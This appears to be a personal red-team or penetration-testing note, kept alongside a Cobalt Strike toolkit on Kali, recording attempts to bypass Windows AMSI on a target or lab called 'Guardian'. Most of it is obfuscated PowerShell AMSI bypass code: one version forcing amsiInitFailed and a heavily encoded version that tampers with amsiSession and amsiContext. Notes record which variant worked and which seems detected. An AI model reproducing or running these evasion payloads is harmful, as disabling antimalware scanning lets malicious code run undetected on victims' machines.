This `AMSI` still works on my home computer, but in `Guardian` unoficial it did not work - located in `/home/kali/tools/cobaltstrike_30JAN2025/custom-cobalt/Files`
```bash
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
not working in `guardian`
![[Pasted image 20250317134010.png]]
not  working on my local  machine
![[Pasted image 20250317134154.png]]


Command to check if `AMSI` is enabled

- If **AMSI is enabled**, the output will be **`False`**.
- If **AMSI is disabled (bypassed)**, the output will be **`True`**.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').GetValue($null)
```

```bash
#Unknown - Force error 
$j4cQAqWtE5dijQXBhH_w=$null;$UsJaNN=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((7120+1956));$lxdkddz="+('q'+'ê'+'s'+'h'+'z'+'z'+'x'+'z'+'ê'+'q'+'q'+'ì'+'t'+'n'+'p'+'m'+'b'+'î').NoRmaLiZE([CHar]([BYTE]0x46)+[CHAR](21+90)+[ChAr](92+22)+[CHaR]([bYTe]0x6d)+[CHar](59+9)) -replace [CHar]([BytE]0x5c)+[cHaR](39+73)+[cHaR]([BYTE]0x7b)+[cHAR](77*50/50)+[cHar]([BytE]0x6e)+[Char]([bYte]0x7d)";[Threading.Thread]::Sleep(1309);[Ref].Assembly.GetType("System.$([CHaR](77+72-72)+[char]([bYTe]0x61)+[cHaR]([byte]0x6e)+[cHar]([byTE]0x61)+[cHAR](13+90)+[CHaR](101*3/3)+[ChAR]([ByTe]0x6d)+[Char](101)+[chAr]([bYtE]0x6e)+[cHar](35+81)).$(('Ãûtômät'+'íôn').NorMaLiZe([char]([byTe]0x46)+[chaR]([byTE]0x6f)+[chaR](114*67/67)+[ChAr]([byTE]0x6d)+[CHaR]([BYTe]0x44)) -replace [chaR](92*83/83)+[chAr]([ByTE]0x70)+[cHAR]([bYTE]0x7b)+[cHAR](77*47/47)+[char](43+67)+[ChAR](125*82/82)).$(('ÁmsíÛ'+'tíls').nOrmalizE([CHar]([byTe]0x46)+[cHaR]([BYTE]0x6f)+[chAR]([BYte]0x72)+[cHaR](109)+[ChAr](68+37-37)) -replace [chAR](49+43)+[cHAR]([BYTE]0x70)+[ChaR](123)+[CHAR]([BYte]0x4d)+[CHar](110*19/19)+[cHar]([bYte]0x7d))").GetField("$(('âmsîSéssí'+'õn').noRMaliZe([Char]([BYTE]0x46)+[cHAR]([ByTE]0x6f)+[CHaR](107+7)+[chAR](109+61-61)+[chAR]([bytE]0x44)) -replace [Char](92+67-67)+[Char]([byTE]0x70)+[CHar]([BYte]0x7b)+[CHAR]([bYTE]0x4d)+[ChAR]([ByTe]0x6e)+[chaR]([bYte]0x7d))", "NonPublic,Static").SetValue($j4cQAqWtE5dijQXBhH_w, $j4cQAqWtE5dijQXBhH_w);[Ref].Assembly.GetType("System.$([CHaR](77+72-72)+[char]([bYTe]0x61)+[cHaR]([byte]0x6e)+[cHar]([byTE]0x61)+[cHAR](13+90)+[CHaR](101*3/3)+[ChAR]([ByTe]0x6d)+[Char](101)+[chAr]([bYtE]0x6e)+[cHar](35+81)).$(('Ãûtômät'+'íôn').NorMaLiZe([char]([byTe]0x46)+[chaR]([byTE]0x6f)+[chaR](114*67/67)+[ChAr]([byTE]0x6d)+[CHaR]([BYTe]0x44)) -replace [chaR](92*83/83)+[chAr]([ByTE]0x70)+[cHAR]([bYTE]0x7b)+[cHAR](77*47/47)+[char](43+67)+[ChAR](125*82/82)).$(('ÁmsíÛ'+'tíls').nOrmalizE([CHar]([byTe]0x46)+[cHaR]([BYTE]0x6f)+[chAR]([BYte]0x72)+[cHaR](109)+[ChAr](68+37-37)) -replace [chAR](49+43)+[cHAR]([BYTE]0x70)+[ChaR](123)+[CHAR]([BYte]0x4d)+[CHar](110*19/19)+[cHar]([bYte]0x7d))").GetField("$([ChAR](24+73)+[ChAR](34+75)+[ChAR]([bYTE]0x73)+[cHaR](105*68/68)+[chAr](67+13-13)+[cHAR]([byTE]0x6f)+[CHAr]([ByTe]0x6e)+[chAr]([bYte]0x74)+[CHAR]([BYTE]0x65)+[CHaR]([byTe]0x78)+[char]([BytE]0x74))", "NonPublic,Static").SetValue($j4cQAqWtE5dijQXBhH_w, [IntPtr]$UsJaNN);$ajjagfuhrgvf="+('õwbcqlãytgàùqrbîcúwáfw'+'mcbv').noRMalIze([CHAr]([bYte]0x46)+[char](111)+[chAr](96+18)+[chaR](109+60-60)+[CHaR]([bytE]0x44)) -replace [cHAR]([byte]0x5c)+[chAr](80+32)+[ChaR]([bytE]0x7b)+[CHAR]([BYte]0x4d)+[CHAR](110+8-8)+[ChAR](125*107/107)";[Threading.Thread]::Sleep(190)
```
this disabled `amsi`
![[Pasted image 20250317135501.png]]
`trollAMSI` fails now on `guardian` - possibly burnt

![[Pasted image 20250317135714.png]]